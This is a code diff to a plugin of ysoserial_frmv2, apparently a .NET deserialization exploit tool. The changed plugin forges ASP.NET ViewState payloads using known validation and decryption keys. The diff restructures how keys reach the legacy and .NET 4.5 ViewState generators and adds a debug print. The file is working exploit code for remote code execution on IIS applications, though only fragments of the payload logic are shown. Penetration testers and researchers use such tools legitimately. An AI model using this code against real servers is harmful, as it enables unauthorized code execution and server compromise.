@@ -206,8 +206,12 @@ namespace ysoserial_frmv2.Plugins
             var readOnlyField = typeof(ConfigurationElement).GetField("_bReadOnly", BindingFlags.Instance | BindingFlags.NonPublic);
             readOnlyField.SetValue(config, false);
             // we don't really need the encryption/decyption keys to create a valid legacy viewstate but this is used when isEncrypted=true
-            if (isLegacy && !String.IsNullOrEmpty(decryptionKey))
+            if (!String.IsNullOrEmpty(decryptionKey) && (!isLegacy || (isLegacy && isEncrypted)))
             {
+                if (isDebug)
+                {
+                    Console.WriteLine("Encryption is on!");
+                }
                 config.Decryption = decryptionAlg;
                 config.DecryptionKey = decryptionKey;
             }
@@ -219,18 +223,17 @@ namespace ysoserial_frmv2.Plugins
 
             if (isLegacy)
             {
-                finalPayload = generateViewStateLegacy_2_to_4(targetPagePath, parsedViewstateGeneratorIdentifier, IISAppInPathOrVirtualDir, isEncrypted, decryptionAlg, decryptionKey, validationAlg, validationKey, viewStateUserKey, payload);
+                finalPayload = generateViewStateLegacy_2_to_4(targetPagePath, parsedViewstateGeneratorIdentifier, IISAppInPathOrVirtualDir, isEncrypted, viewStateUserKey, payload);
             }
             else
             {
-                finalPayload = generateViewState_4dot5(targetPagePath, IISAppInPathOrVirtualDir, decryptionAlg, decryptionKey, validationAlg, validationKey, viewStateUserKey, payload);
+                finalPayload = generateViewState_4dot5(targetPagePath, IISAppInPathOrVirtualDir, viewStateUserKey, payload);
             }
 
             return finalPayload;
         }
 
-        private object generateViewStateLegacy_2_to_4(string targetPagePath, uint parsedViewstateGeneratorIdentifier, string IISAppInPath, bool isEncrypted, string decryptionAlg, string decryptionKey, string validationAlg,
-    string validationKey, string viewStateUserKey, byte[] payload)
+        private object generateViewStateLegacy_2_to_4(string targetPagePath, uint parsedViewstateGeneratorIdentifier, string IISAppInPath, bool isEncrypted, string viewStateUserKey, byte[] payload)
         {
             var stringUtilType = systemWebAsm.GetType("System.Web.Util.StringUtil");
             var nonRandomizedHashCodeMethod = stringUtilType.GetMethod("GetNonRandomizedHashCode", BindingFlags.Static | BindingFlags.NonPublic);
@@ -295,8 +298,7 @@ namespace ysoserial_frmv2.Plugins
             return System.Convert.ToBase64String(byteResult);
         }
 
-        private object generateViewState_4dot5(string targetPagePath, string IISAppInPath, string decryptionAlg, string decryptionKey, string validationAlg,
-            string validationKey, string viewStateUserKey, byte[] payload)
+        private object generateViewState_4dot5(string targetPagePath, string IISAppInPath, string viewStateUserKey, byte[] payload)
         {
             var purposeType = systemWebAsm.GetType("System.Web.Security.Cryptography.Purpose");
             object[] parameters = new object[2];
